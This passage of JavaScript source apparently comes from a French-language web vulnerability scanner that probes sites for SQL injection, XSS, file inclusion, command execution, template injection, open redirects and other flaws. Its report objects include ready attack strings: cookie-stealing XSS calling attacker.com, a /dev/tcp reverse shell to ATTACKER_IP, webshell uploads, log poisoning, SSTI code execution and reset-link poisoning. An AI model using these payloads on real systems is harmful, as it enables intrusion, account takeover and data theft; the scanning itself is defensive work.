  onLine('  ▸ Time-Based Blind SQLi ...');
  for (const { payload, delay: expected, db: dbName } of PAYLOADS.sqli.time_payloads) {
    for (const param of PAYLOADS.sqli.params.slice(0, 4)) {
      try {
        const u  = new URL(url.href);
        u.searchParams.set(param, payload);
        const t0   = Date.now();
        const resp = await safeFetch(u.href, { timeout: 12000 });
        await resp.text();
        const elapsed = Date.now() - t0;

        if (elapsed >= expected * 0.8) {
          onLine(`  ! SQLi TIME-BASED (${esc(dbName)}) sur '${esc(param)}' — ${elapsed}ms`);
          if (alertEmail) await sendAlert(alertEmail, 'SQL_INJECTION_BLIND', url.href,
            `Time-based blind SQLi on ${param}, delay=${elapsed}ms, db=${dbName}`);
          return {
            status: 'FAIL',
            vulnerable: true,
            type: 'time_based_blind',
            db: dbName,
            param,
            elapsed_ms: elapsed,
            exploitation: {
              description: `SQLi blind time-based (${dbName}): extraction de données caractère par caractère via délais de réponse.`,
              example: `sqlmap -u "${url.href}?${param}=1" -p "${param}" --technique=T --dbs --batch`,
              manual: `# Vérification manuelle (si délai > 4s → vulnérable):\n${url.href}?${param}=1' AND SLEEP(5)--`,
              tools: ['sqlmap', 'Burp Suite Intruder'],
              impact: 'Extraction complète des données (plus lent qu\'error-based mais tout aussi efficace).',
              cvss: 8.8,
              remediation: 'Prepared statements, timeouts DB, monitoring des requêtes anormalement lentes.',
            },
          };
        }
      } catch (_) {}
      await wait(SCAN_DELAY);
    }
  }

  // — Boolean-based blind —
  onLine('  ▸ Boolean-Based Blind SQLi ...');
  for (const param of PAYLOADS.sqli.params.slice(0, 5)) {
    try {
      const base = new URL(url.href); base.searchParams.set(param, '1');
      const baseText = await (await safeFetch(base.href, { timeout: 6000 })).text();

      for (const { t, f } of PAYLOADS.sqli.boolean_pairs) {
        const uT = new URL(url.href); uT.searchParams.set(param, '1' + t);
        const uF = new URL(url.href); uF.searchParams.set(param, '1' + f);
        const tText = await (await safeFetch(uT.href, { timeout: 6000 })).text();
        const fText = await (await safeFetch(uF.href, { timeout: 6000 })).text();

        // Vrai ≈ baseline, Faux diverge nettement → injection booléenne probable.
        if (lenRatio(baseText, tText) > 0.97 && lenRatio(baseText, fText) < 0.85
            && Math.abs(tText.length - fText.length) > 40) {
          onLine(`  ! SQLi BOOLEAN-BLIND sur '${esc(param)}'`);
          if (alertEmail) await sendAlert(alertEmail, 'SQL_INJECTION_BLIND', url.href, `Boolean-based blind on ${param}`);
          return {
            status: 'FAIL',
            vulnerable: true,
            type: 'boolean_blind',
            param,
            exploitation: {
              description: 'SQLi blind booléenne : les réponses « condition vraie » et « condition fausse » diffèrent nettement → extraction bit à bit possible.',
              example: `sqlmap -u "${url.href}?${param}=1" -p "${param}" --technique=B --dbs --batch`,
              manual: `# Preuve manuelle :\n${url.href}?${param}=1' AND '1'='1   → page normale\n${url.href}?${param}=1' AND '1'='2   → page différente`,
              tools: ['sqlmap', 'Burp Suite Intruder'],
              impact: 'Extraction complète de la base, caractère par caractère (sans message d\'erreur).',
              cvss: 8.6,
              remediation: 'Requêtes préparées (paramétrées), réponses normalisées, WAF.',
            },
          };
        }
        await wait(SCAN_DELAY);
      }
    } catch (_) {}
  }

  onLine('  ✓ SQLi non détectée');
  return { status: 'OK', vulnerable: false };
}

// ─── MODULE: XSS ──────────────────────────────────────────────────────────────
async function testXSS(url, onLine, alertEmail) {
  onLine('▸ [XSS] Cross-Site Scripting .....................');

  const canary = 'netguard' + Math.random().toString(36).substring(2, 6);

  for (const rawPayload of PAYLOADS.xss.payloads) {
    const payload = rawPayload.replace('netguard', canary);

    for (const param of PAYLOADS.xss.params.slice(0, 6)) {
      try {
        const u = new URL(url.href);
        u.searchParams.set(param, payload);
        const resp = await safeFetch(u.href, { timeout: 5000 });
        const text = await resp.text();
        const ct   = resp.headers.get('content-type') || '';

        if (!ct.includes('text/html') && !ct.includes('text/plain')) continue;
        if (!text.includes(payload)) continue;

        // Verify it's NOT HTML-entity encoded (which would be safe)
        const encoded = text.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
        if (encoded) continue;

        onLine(`  ! XSS réfléchi sur '${esc(param)}'`);
        if (alertEmail) await sendAlert(alertEmail, 'XSS_REFLECTED', url.href, `Reflected XSS on param: ${param}`);
        return {
          status: 'FAIL',
          vulnerable: true,
          type: 'reflected',
          param,
          payload,
          exploitation: {
            description: 'XSS réfléchi: payload injecté dans l\'URL, exécuté dans le navigateur de la victime via un lien malveillant.',
            example: `${url.href}?${param}=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>`,
            beef_hook: `${url.href}?${param}=<script src="https://BEEF_SERVER:3000/hook.js"></script>`,
            phishing: `Envoyer à la victime: "${url.href}?${param}=<img src=x onerror=\\"fetch('https://attacker.com/?c='+btoa(document.cookie))\\">`,
            tools: ['BeEF Framework', 'XSSer', 'dalfox', 'Burp Suite'],
            impact: 'Vol de cookies/sessions, keylogging, redirection phishing, téléchargement de malware, défacement.',
            cvss: 6.1,
            remediation: 'htmlspecialchars() en sortie, CSP strict (no unsafe-inline), HttpOnly sur les cookies, validation des entrées.',
          },
        };
      } catch (_) {}
      await wait(SCAN_DELAY);
    }
  }

  onLine('  ✓ XSS réfléchi non détecté');
  return { status: 'OK', vulnerable: false };
}

// ─── MODULE: LFI ──────────────────────────────────────────────────────────────
async function testLFI(url, onLine, alertEmail) {
  onLine('▸ [LFI] Local File Inclusion .....................');

  for (const payload of PAYLOADS.lfi.paths) {
    for (const param of PAYLOADS.lfi.params.slice(0, 5)) {
      try {
        const u    = new URL(url.href);
        u.searchParams.set(param, payload);
        const resp = await safeFetch(u.href, { timeout: 5000 });
        const text = await resp.text();

        if (PAYLOADS.lfi.strictIndicators.some(ind => ind.test(text))) {
          onLine(`  ! LFI confirmée sur '${esc(param)}' — contenu système détecté`);
          if (alertEmail) await sendAlert(alertEmail, 'LFI', url.href, `LFI on param: ${param}, payload: ${payload}`);
          return {
            status: 'FAIL',
            vulnerable: true,
            param,
            payload,
            exploitation: {
              description: 'LFI: lecture de fichiers locaux du serveur. Peut évoluer vers RCE via log poisoning.',
              example: `${url.href}?${param}=../../../../etc/passwd`,
              php_wrapper: `${url.href}?${param}=php://filter/convert.base64-encode/resource=/etc/passwd`,
              log_poisoning: `# 1. Injecter du PHP dans les logs Apache:\ncurl -A "<?php system(\$_GET['c']); ?>" ${url.href}\n# 2. Inclure le log:\n${url.href}?${param}=../../../../var/log/apache2/access.log&c=id`,
              tools: ['LFISuite', 'kadimus', 'Burp Suite'],
              impact: 'Lecture de /etc/passwd, clés SSH privées, .env, source code → escalade vers RCE.',
              cvss: 7.5,
              remediation: 'Whitelist des fichiers autorisés, realpath() + basename(), désactiver allow_url_include.',
            },
          };
        }
      } catch (_) {}
      await wait(SCAN_DELAY);
    }
  }

  onLine('  ✓ LFI non détectée');
  return { status: 'OK', vulnerable: false };
}

// ─── MODULE: RCE ──────────────────────────────────────────────────────────────
async function testRCE(url, onLine, alertEmail) {
  onLine('▸ [RCE] Remote Code Execution ...................');

  // Use a canary string to avoid false positives from common words
  const canary = 'netguardrce' + Math.random().toString(36).substring(2, 6);

  const payloads = [
    `; echo ${canary}`,
    `| echo ${canary}`,
    `$(echo ${canary})`,
    `\`echo ${canary}\``,
    `& echo ${canary}`,
    `|| echo ${canary}`,
  ];

  for (const payload of payloads) {
    for (const param of PAYLOADS.rce.params.slice(0, 5)) {
      try {
        const u = new URL(url.href);
        u.searchParams.set(param, `test${payload}`);
        const resp = await safeFetch(u.href, { timeout: 6000 });
        const text = await resp.text();

        if (text.includes(canary)) {
          onLine(`  ! RCE confirmée sur '${esc(param)}' — canary exécuté`);
          if (alertEmail) await sendAlert(alertEmail, 'RCE', url.href, `RCE on param: ${param}`);
          return {
            status: 'FAIL',
            vulnerable: true,
            param,
            payload,
            exploitation: {
              description: 'RCE: exécution de commandes arbitraires sur le serveur — vulnérabilité maximale.',
              example: `${url.href}?${param}=test;cat /etc/passwd`,
              reverse_shell: `# Reverse shell (remplacer ATTACKER_IP et PORT):\n${url.href}?${param}=;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n# Côté attaquant:\nnc -lvnp 4444`,
              web_shell: `# Upload webshell:\n${url.href}?${param}=;echo '<?php system(\$_GET[c]);?>' > /var/www/html/shell.php`,
              tools: ['Commix', 'Burp Suite', 'Metasploit multi/handler'],
              impact: 'Contrôle total du serveur, installation de backdoor, ransomware, pivoting réseau.',
              cvss: 10.0,
              remediation: 'Ne jamais passer de données utilisateur à system()/exec()/shell_exec(). Utiliser des APIs dédiées sans shell.',
            },
          };
        }
      } catch (_) {}
      await wait(SCAN_DELAY);
    }
  }

  onLine('  ✓ RCE non détectée');
  return { status: 'OK', vulnerable: false };
}

// ─── MODULE: SSTI ─────────────────────────────────────────────────────────────
async function testSSTI(url, onLine, alertEmail) {
  onLine('▸ [SSTI] Server-Side Template Injection .........');

  for (const { payload, expected, engine } of PAYLOADS.ssti.tests) {
    for (const param of PAYLOADS.ssti.params.slice(0, 5)) {
      try {
        const u    = new URL(url.href);
        u.searchParams.set(param, payload);
        const resp = await safeFetch(u.href, { timeout: 5000 });
        const text = await resp.text();

        // The expression must be evaluated (expected result present) but NOT reflected as-is
        if (text.includes(expected) && !text.includes(payload)) {
          onLine(`  ! SSTI ${esc(engine)} sur '${esc(param)}' — 7*7=${esc(expected)}`);
          if (alertEmail) await sendAlert(alertEmail, 'SSTI', url.href, `SSTI (${engine}) on param: ${param}`);

          const examples = {
            'Jinja2/Twig':     `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`,
            'Mako/Freemarker': `\${self.module.cache.util.os.popen('id').read()}`,
            'ERB/EJS':         `<%= \`id\` %>`,
            'Spring SpEL':     `*{T(java.lang.Runtime).getRuntime().exec('id')}`,
            'Ruby':            `#{%x[id]}`,
          };

          return {
            status: 'FAIL',
            vulnerable: true,
            engine,
            param,
            payload,
            exploitation: {
              description: `SSTI ${engine}: le moteur de templates évalue vos expressions — RCE immédiate.`,
              math_proof: `Payload: ${payload} → Résultat: ${expected} (preuve d\'évaluation serveur)`,
              rce_payload: examples[engine] || `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`,
              tools: ['tplmap', 'SSTImap', 'Burp Suite'],
              impact: 'RCE complète, accès aux variables d\'environnement, secrets de l\'application.',
              cvss: 9.8,
              remediation: 'Ne jamais rendre des entrées utilisateur via un moteur de templates. Utiliser une sandbox (Jinja2 SandboxedEnvironment).',
            },
          };
        }
      } catch (_) {}
      await wait(SCAN_DELAY);
    }
  }

  onLine('  ✓ SSTI non détectée');
  return { status: 'OK', vulnerable: false };
}

// ─── MODULE: Open Redirect ────────────────────────────────────────────────────
async function testOpenRedirect(url, onLine) {
  onLine('▸ [REDIRECT] Open Redirect ......................');

  const marker = PAYLOADS.openRedirect.marker;

  for (const param of PAYLOADS.openRedirect.params) {
    try {
      const u = new URL(url.href);
      u.searchParams.set(param, `https://${marker}/login`);
      const resp     = await safeFetch(u.href, { redirect: 'manual', timeout: 5000 });
      const location = resp.headers.get('location') || '';

      if (resp.status >= 300 && resp.status < 400 && location.includes(marker)) {
        onLine(`  ! Open Redirect sur '${esc(param)}' → ${esc(location)}`);
        return {
          status: 'WARN',
          vulnerable: true,
          param,
          exploitation: {
            description: 'Open Redirect: un lien légitime (votre domaine) peut rediriger vers n\'importe quel site.',
            example: `${url.href}?${param}=https://fake-bank.com/login`,
            phishing: `# Email de phishing crédible:\n"Votre compte expire, reconnectez-vous:\n${url.href}?${param}=https://phishing.com/login-fake"`,
            oauth_abuse: `# Abuse OAuth (si utilisé avec OAuth):
# 1. Trouver un endpoint OAuth utilisant redirect_uri
# 2. Injecter l'Open Redirect pour capturer le token
# ${url.href}?${param}=https://attacker.com/callback`,
            tools: ['Burp Suite', 'curl -L', 'OpenRedireX'],
            impact: 'Phishing très crédible (URL officielle), bypass de filtres de sécurité, vol de tokens OAuth.',
            cvss: 6.1,
            remediation: 'Whitelist des URLs autorisées, ou utiliser des identifiants internes (ex: redirect=home) plutôt que des URLs absolues.',
          },
        };
      }
    } catch (_) {}
    await wait(SCAN_DELAY);
  }

  onLine('  ✓ Open Redirect non détecté');
  return { status: 'OK', vulnerable: false };
}

// ─── MODULE: HTTP Methods ─────────────────────────────────────────────────────
async function testHTTPMethods(url, onLine) {
  onLine('▸ [METHODS] Méthodes HTTP dangereuses ...........');
  const enabled = [];

  for (const { method, risk } of PAYLOADS.httpMethods.dangerous) {
    try {
      const resp = await safeFetch(url.href, { method, timeout: 4000 });

      if (method === 'OPTIONS') {
        const allow = resp.headers.get('allow') || resp.headers.get('access-control-allow-methods') || '';
        if (['PUT', 'DELETE', 'TRACE'].some(m => allow.toUpperCase().includes(m))) {
          enabled.push({ method: `OPTIONS → ${allow}`, status: resp.status, risk });
          onLine(`  ! Allow header révèle: ${esc(allow)}`);
        }
        continue;
      }

      if (method === 'TRACE') {
        if (resp.status === 200) {
          const body = await resp.text();
          if (body.includes('TRACE') || body.toUpperCase().includes('TRACE')) {
            enabled.push({ method, status: resp.status, risk });
            onLine(`  ! TRACE activé (XST possible)`);
          }
        }
        continue;
      }

      // PUT/DELETE: non-405/501 = potentially accepted
      if (resp.status !== 405 && resp.status !== 501 && resp.status !== 404 && resp.status !== 403) {
        enabled.push({ method, status: resp.status, risk });
        onLine(`  ! ${method} retourne HTTP ${resp.status} (non rejeté)`);
      }
    } catch (_) {}
    await wait(100);
  }

  if (!enabled.length) {
    onLine('  ✓ Méthodes dangereuses désactivées');
    return { status: 'OK', dangerous_methods: [] };
  }

  const hasPut = enabled.some(m => m.method === 'PUT');
  return {
    status: hasPut ? 'FAIL' : 'WARN',
    dangerous_methods: enabled,
    exploitation: {
      description: `Méthodes HTTP dangereuses acceptées: ${enabled.map(m => m.method).join(', ')}`,
      example: hasPut
        ? `# Upload d'un webshell via PUT:\ncurl -X PUT ${url.href}/shell.php -d "<?php system(\$_GET['c']); ?>"\n# Exécution:\ncurl "${url.href}/shell.php?c=id"`
        : `# XST (Cross-Site Tracing) via TRACE:\ncurl -X TRACE ${url.href} -H "Cookie: session=victim_token"\n# Le cookie est reflété dans la réponse (lisible via XHR/XSS)`,
      tools: ['curl', 'Burp Suite', 'Nikto'],
      impact: hasPut ? 'Upload de webshell → RCE complète.' : 'XST → récupération de cookies HttpOnly via XSS.',
      cvss: hasPut ? 9.8 : 5.4,
      remediation: 'Désactiver TRACE dans Apache/Nginx (TraceEnable off). N\'autoriser que GET, POST, HEAD.',
    },
  };
}

// ─── MODULE: HTTPS Redirect ───────────────────────────────────────────────────
async function testHTTPSRedirect(url, onLine) {
  onLine('▸ [HTTPS] Redirection HTTP → HTTPS ..............');
  try {
    const httpUrl = new URL(url.href);
    httpUrl.protocol = 'http:';
    httpUrl.port = '';
    const resp = await safeFetch(httpUrl.href, { redirect: 'manual', timeout: 5000 });
    const loc  = resp.headers.get('location') || '';
    const redirectsToHttps = resp.status >= 300 && resp.status < 400 && /^https:/i.test(loc);

    if (redirectsToHttps) {
      onLine('  ✓ HTTP redirige bien vers HTTPS');
      return { status: 'OK', redirects: true };
    }
    if (resp.status >= 200 && resp.status < 300) {
      onLine('  ! HTTP sert du contenu sans rediriger vers HTTPS');
      return {
        status: 'WARN',
        redirects: false,
        exploitation: {
          description: 'Le site répond en HTTP sans forcer HTTPS : un attaquant réseau peut intercepter la 1ʳᵉ requête (sslstrip) et rester en clair.',
          example: `# Vérification :\ncurl -sI http://${url.hostname}/ | grep -i location\n# (aucune redirection 301/302 vers https:// = vulnérable)`,
          manual: '# Attaque sslstrip sur un Wi-Fi public :\nbettercap -iface wlan0 -eval "set http.proxy.sslstrip true; http.proxy on"',
          tools: ['bettercap', 'sslstrip', 'mitmproxy'],
          impact: 'Interception des identifiants/cookies transmis en clair avant la bascule HTTPS.',
          cvss: 6.5,
          remediation: 'Rediriger tout le trafic HTTP en 301 vers HTTPS, puis activer HSTS avec preload.',
        },
      };
    }
    onLine('  ✓ HTTP non exploitable');
    return { status: 'OK', redirects: false };
  } catch (e) {
    onLine('  ✓ HTTP inaccessible (bon signe)');
    return { status: 'OK' };
  }
}

// ─── MODULE: Mixed Content & SRI ──────────────────────────────────────────────
async function testMixedContent(url, onLine) {
  onLine('▸ [MIXED] Contenu mixte & intégrité (SRI) ......');
  if (url.protocol !== 'https:') { onLine('  • Cible HTTP — non applicable'); return { status: 'OK' }; }
  try {
    const resp = await safeFetch(url.href, { redirect: 'follow' });
    const body = await resp.text();

    const mixed = [...body.matchAll(/(?:src|href)\s*=\s*["'](http:\/\/[^"']+)["']/gi)]
      .map(m => m[1]).filter((v, i, a) => a.indexOf(v) === i).slice(0, 8);

    const extScripts = [...body.matchAll(/<script[^>]+src\s*=\s*["'](https?:\/\/[^"']+)["'][^>]*>/gi)];
    const noSri = extScripts
      .filter(s => !/integrity\s*=/i.test(s[0]))
      .map(s => s[1])
      .filter(u => { try { return new URL(u).hostname !== url.hostname; } catch { return false; } })
      .filter((v, i, a) => a.indexOf(v) === i).slice(0, 8);

    mixed.forEach(m => onLine(`  ! Ressource HTTP sur page HTTPS: ${esc(m)}`));
    noSri.forEach(s => onLine(`  ! Script externe sans SRI: ${esc(s)}`));
    if (!mixed.length && !noSri.length) { onLine('  ✓ Aucun contenu mixte, SRI OK'); return { status: 'OK' }; }

    const status = mixed.length ? 'FAIL' : 'WARN';
    return {
      status,
      mixed_content: mixed,
      missing_sri: noSri,
      exploitation: {
        description: mixed.length
          ? 'Ressources chargées en HTTP sur une page HTTPS : le cadenas est cassé et un attaquant réseau peut injecter du JS malveillant à la place.'
          : 'Scripts tiers chargés sans Subresource Integrity (SRI) : si le CDN est compromis, du code arbitraire s\'exécute chez vos visiteurs.',
        example: mixed.length
          ? `# Ressource interceptable :\n${mixed[0]}\n# Un MITM remplace ce fichier par du JS malveillant.`
          : `# Script sans garde-fou :\n${noSri[0]}\n# Ajouter :  <script src="..." integrity="sha384-..." crossorigin="anonymous">`,
        tools: ['bettercap', 'mitmproxy', 'SecurityHeaders.com'],
        impact: mixed.length ? 'Injection de JS via MITM → vol de session, keylogging.' : 'Supply-chain : compromission du CDN → exécution chez tous les visiteurs.',
        cvss: mixed.length ? 7.4 : 5.3,
        remediation: 'Charger toutes les ressources en HTTPS. Ajouter integrity + crossorigin sur les scripts tiers. Activer une CSP.',
      },
    };
  } catch (e) {
    onLine(`  ! Mixed content erreur: ${esc(e.message)}`);
    return { status: 'ERROR', error: e.message };
  }
}

// ─── MODULE: Directory Listing ────────────────────────────────────────────────
async function testDirListing(url, onLine) {
  onLine('▸ [DIRLIST] Listing de répertoires .............');
  const dirs = ['/uploads/', '/images/', '/img/', '/files/', '/backup/', '/backups/',
    '/assets/', '/static/', '/js/', '/css/', '/tmp/', '/data/', '/media/', '/downloads/'];
  const found = [];
  for (const d of dirs) {
    try {
      const r = await safeFetch(new URL(d, url.href).href, { timeout: 3000, redirect: 'manual' });
      if (r.status === 200) {
        const t = await r.text();
        if (/<title>\s*Index of \//i.test(t) || /Directory listing for/i.test(t) || /\[To Parent Directory\]/i.test(t)) {
          found.push(d);
          onLine(`  ! Listing exposé: ${esc(d)}`);
        }
      }
    } catch (_) {}
    await wait(80);
  }
  if (!found.length) { onLine('  ✓ Aucun listing de répertoire exposé'); return { status: 'OK', dirs: [] }; }
  return {
    status: 'WARN',
    exposed_dirs: found,
    exploitation: {
      description: `Listing de répertoire activé sur : ${found.join(', ')}. Le serveur affiche le contenu des dossiers, révélant des fichiers non liés depuis le site.`,
      example: found.map(d => `curl -s ${url.origin}${d}`).join('\n'),
      manual: `# Aspirer tout le dossier exposé :\nwget -r -np -nH ${url.origin}${found[0]}`,
      tools: ['curl', 'wget', 'dirsearch'],
      impact: 'Découverte de backups, fichiers sources, documents privés, uploads d\'autres utilisateurs.',
      cvss: 5.3,
      remediation: 'Désactiver l\'autoindex (Apache: "Options -Indexes" ; Nginx: "autoindex off;").',
    },
  };
}

// ─── MODULE: Host Header Injection ────────────────────────────────────────────
async function testHostInjection(url, onLine) {
  onLine('▸ [HOST] Injection Host Header .................');
  const evil = 'evil-netguard.test';
  try {
    const resp = await safeFetch(url.href, {
      headers: { 'X-Forwarded-Host': evil, 'X-Host': evil, 'X-Forwarded-Server': evil },
      redirect: 'manual', timeout: 5000,
    });
    const loc  = resp.headers.get('location') || '';
    const body = await resp.text();
    const inRedirect = loc.includes(evil);
    const inBody     = body.includes(evil);
    if (!inRedirect && !inBody) { onLine('  ✓ Host header non reflété'); return { status: 'OK', vulnerable: false }; }

    onLine(`  ! Host injecté reflété dans ${inRedirect ? 'la redirection' : 'la page'}`);
    return {
      status: inRedirect ? 'FAIL' : 'WARN',
      vulnerable: true,
      location: inRedirect,
      exploitation: {
        description: 'Le serveur fait confiance à l\'en-tête Host/X-Forwarded-Host fourni par le client. Menace principale : empoisonnement des liens de réinitialisation de mot de passe.',
        example: `curl -s ${url.href} -H "X-Forwarded-Host: ${evil}" | grep -i ${evil}`,
        phishing: `# Empoisonnement du reset de mot de passe :\n# 1. L'attaquant déclenche "mot de passe oublié" pour la victime avec :\ncurl -X POST ${url.origin}/reset -H "Host: attacker.com" -d "email=victime@x.com"\n# 2. Le mail de reset contient un lien vers https://attacker.com/reset?token=...\n# 3. La victime clique → le token part chez l'attaquant → compte volé`,
        tools: ['Burp Suite', 'curl'],
        impact: 'Prise de compte via empoisonnement du reset password, cache poisoning, contournement de contrôles basés sur le Host.',
        cvss: inRedirect ? 7.4 : 5.3,
        remediation: 'Utiliser une liste blanche de domaines autorisés côté serveur, ignorer X-Forwarded-Host, définir une base URL fixe pour les emails.',
      },
    };
  } catch (e) {
    onLine(`  ! Host injection erreur: ${esc(e.message)}`);
    return { status: 'ERROR', error: e.message };
  }
}

// ─── MODULE: Error / Stack Trace Disclosure ───────────────────────────────────
async function testErrorDisclosure(url, onLine) {
  onLine('▸ [ERRORS] Fuite de messages d\'erreur .........');
  const patterns = [
    { rx: /Fatal error:|Parse error:|Warning:.*on line \d+/i,          tech: 'PHP' },
    { rx: /Traceback \(most recent call last\)/i,                       tech: 'Python' },
    { rx: /at [\w.$]+\([\w]+\.java:\d+\)|java\.lang\.[A-Za-z.]+Exception/, tech: 'Java' },
    { rx: /System\.[A-Za-z.]+Exception|Microsoft \.NET Framework|\bASP\.NET\b/i, tech: '.NET' },
    { rx: /ORA-\d{5}|SQLSTATE\[|SQL syntax.*MySQL/i,                    tech: 'SQL/DB' },
    { rx: /Error: Cannot GET|at Object\.<anonymous>|node_modules/i,     tech: 'Node.js' },
  ];
  const probes = ["'", '%00', '../../', '[]=1', 'x\';'];
  for (const probe of probes) {
    try {
      const u = new URL(url.href);
      u.searchParams.set('q', probe);
      const resp = await safeFetch(u.href, { timeout: 5000 });
      const text = await resp.text();
      const hit  = patterns.find(p => p.rx.test(text));
      if (hit) {
        onLine(`  ! Stack trace ${hit.tech} exposée (payload: ${esc(probe)})`);
        return {
          status: 'WARN',
          tech: hit.tech,
          payload: probe,
          exploitation: {
            description: `Le serveur renvoie une erreur détaillée ${hit.tech} au lieu d'une page générique. Ça révèle la stack technique, des chemins internes et parfois des requêtes SQL.`,
            example: `${u.href}\n# → la réponse contient une trace ${hit.tech} exploitable pour affiner une attaque.`,
            manual: '# Ces messages guident l\'attaquant : versions exactes → CVE ciblés, chemins → LFI, requêtes → SQLi.',
            tools: ['Burp Suite', 'curl'],
            impact: 'Divulgation d\'informations : chemins serveur, versions logicielles, structure de la base — facilite les attaques suivantes.',
            cvss: 5.3,
            remediation: `Désactiver l'affichage des erreurs en production (${hit.tech === 'PHP' ? 'display_errors=Off' : 'mode production'}). Renvoyer des pages 404/500 génériques.`,
          },
        };
      }
    } catch (_) {}
    await wait(SCAN_DELAY);
  }
  onLine('  ✓ Aucune fuite de message d\'erreur');
  return { status: 'OK' };
}

// ─── MODULE: Secrets exposés dans le code client (JS/HTML) ────────────────────
async function testSecretsInJS(url, onLine) {
  onLine('▸ [SECRETS] Clés/API exposées dans le code .....');
  try {
    const resp = await safeFetch(url.href, { redirect: 'follow' });
    const html = await resp.text();
    const sources = [{ where: 'HTML', text: html }];

    // Récupère les scripts externes same-origin (limité pour rester léger).
    const srcs = [...html.matchAll(/<script[^>]+src\s*=\s*["']([^"']+)["']/gi)]
      .map(m => { try { return new URL(m[1], url.href).href; } catch { return null; } })
      .filter(Boolean)
      .filter(u => { try { return new URL(u).hostname === url.hostname; } catch { return false; } })
      .filter((v, i, a) => a.indexOf(v) === i)
      .slice(0, 6);

    for (const js of srcs) {
      try {
        const r = await safeFetch(js, { timeout: 5000 });
        if (r.ok) sources.push({ where: js.replace(url.origin, ''), text: (await r.text()).slice(0, 500000) });
      } catch (_) {}
      await wait(60);
    }

    const found = [];
    const seen  = new Set();
    for (const src of sources) {
      for (const p of PAYLOADS.secrets.patterns) {
        const m = src.text.match(p.rx);
        if (!m) continue;
        const val = m[0];
        const key = p.name + val.slice(0, 10);
        if (seen.has(key)) continue;
        seen.add(key);
        const masked = val.length > 14 ? val.slice(0, 6) + '…' + val.slice(-4) : val.slice(0, 5) + '…';
        found.push({ type: p.name, severity: p.sev, where: src.where, sample: masked });
        onLine(`  ! ${esc(p.name)} exposé dans ${esc(src.where)} : ${esc(masked)}`);
      }
    }

    if (!found.length) { onLine('  ✓ Aucun secret détecté dans le code client'); return { status: 'OK', secrets: [] }; }

    const hasCritical = found.some(f => f.severity === 'CRITICAL');
    return {
      status: hasCritical ? 'FAIL' : 'WARN',
      secrets: found,
      exploitation: {
        description: `Secrets exposés côté client : ${found.map(f => f.type).join(', ')}. N'importe quel visiteur peut les extraire du code source.`,
        example: `# Extraire les clés du JS :\ncurl -s ${url.href} | grep -oE "AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|sk_live_[0-9a-zA-Z]+"`,
        manual: '# Auditer tout le JS chargé :\n# TruffleHog / gitleaks sur les fichiers .js, ou chercher les patterns de clés dans les bundles.',
        tools: ['curl', 'grep', 'TruffleHog', 'gitleaks'],
        impact: hasCritical
          ? 'Clé secrète/privée exposée → accès direct aux services tiers (AWS, Stripe, DB) : coûts, vol de données, compromission complète.'
          : 'Clé/API exposée → abus de quota et accès non prévu à des services tiers.',
        cvss: hasCritical ? 9.1 : 6.5,
        remediation: 'Ne jamais placer de secret côté client. Révoquer + régénérer toute clé exposée. Router les appels authentifiés via un backend proxy.',
      },
    };
  } catch (e) {
    onLine(`  ! Secrets erreur: ${esc(e.message)}`);
    return { status: 'ERROR', error: e.message };
  }
}

// ─── MODULE: GraphQL Introspection ────────────────────────────────────────────
async function testGraphQL(url, onLine) {
  onLine('▸ [GRAPHQL] Introspection GraphQL ...............');
  for (const ep of PAYLOADS.graphql.endpoints) {
    try {
      const u = new URL(ep, url.origin).href;
      const r = await safeFetch(u, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: PAYLOADS.graphql.introspection,
        timeout: 5000,
      });
      if (!r.ok) continue;
      const text = await r.text();
      if (/"__schema"|"queryType"/.test(text) && /"types"\s*:/.test(text) && /"name"/.test(text)) {
        onLine(`  ! Introspection GraphQL activée sur ${esc(ep)}`);
        return {
          status: 'WARN',
          endpoint: ep,
          exploitation: {
            description: `Endpoint GraphQL avec introspection activée (${ep}) : le schéma complet (types, requêtes, mutations) est exposé publiquement.`,
            example: `curl -s ${url.origin}${ep} -H "Content-Type: application/json" -d '{"query":"{__schema{types{name fields{name}}}}"}'`,
            manual: '# Cartographier toute l\'API à partir du schéma exposé :\n# InQL (Burp), graphql-voyager, ou clairvoyance.',
            tools: ['InQL', 'graphql-voyager', 'clairvoyance', 'Burp Suite'],
            impact: 'Cartographie complète de l\'API, découverte de mutations/champs sensibles, terrain préparé pour IDOR et injections.',
            cvss: 5.3,
            remediation: 'Désactiver l\'introspection en production. Mettre en place des persisted queries (whitelist) + rate limiting.',
          },
        };
      }
    } catch (_) {}
    await wait(100);
  }
  onLine('  ✓ Pas d\'introspection GraphQL exposée');
  return { status: 'OK' };
}

// ─── Mapping OWASP Top 10 (2021) ──────────────────────────────────────────────
const OWASP_NAMES = {
  'A01': 'Broken Access Control',              'A02': 'Cryptographic Failures',
  'A03': 'Injection',                          'A04': 'Insecure Design',
  'A05': 'Security Misconfiguration',          'A06': 'Vulnerable & Outdated Components',
  'A07': 'Identification & Auth Failures',     'A08': 'Software & Data Integrity Failures',
  'A09': 'Security Logging & Monitoring',      'A10': 'Server-Side Request Forgery',
};
const OWASP_MAP = {
  dns: 'A05', tls: 'A02', headers: 'A05', cors: 'A05', cookies: 'A05', tech: 'A06',
  robots: 'A01', https_redirect: 'A02', mixed_content: 'A08', secrets_js: 'A02',
  ports: 'A05', sensitive_files: 'A01', dir_listing: 'A01', graphql: 'A05',
  sqli: 'A03', xss: 'A03', lfi: 'A01', rce: 'A03', mako: 'A03',
  open_redirect: 'A01', http_methods: 'A05', host_injection: 'A10', error_disclosure: 'A09',
};

// Construit la couverture OWASP : pour chaque catégorie, si testée et combien de problèmes.
function buildOwaspCoverage(results) {
  const cov = {};
  for (const [cat, name] of Object.entries(OWASP_NAMES))
    cov[cat] = { category: cat, name, tested: false, issues: 0, modules: [] };
  for (const [mod, res] of Object.entries(results)) {
    const cat = OWASP_MAP[mod];
    if (!cat || !res || !res.status) continue;
    cov[cat].tested = true;
    cov[cat].modules.push(mod);
    if (res.status === 'FAIL' || res.status === 'WARN') cov[cat].issues++;
  }
  return cov;
}

// ─── ORCHESTRATEUR PRINCIPAL ──────────────────────────────────────────────────
// `emit` est un callback simple (line: string) => void fourni par l'appelant.
// `mode` : 'passive' (recon non-intrusif, autorisé partout) ou 'active'
// (énumération + injection — réservé aux domaines dont l'utilisateur a prouvé
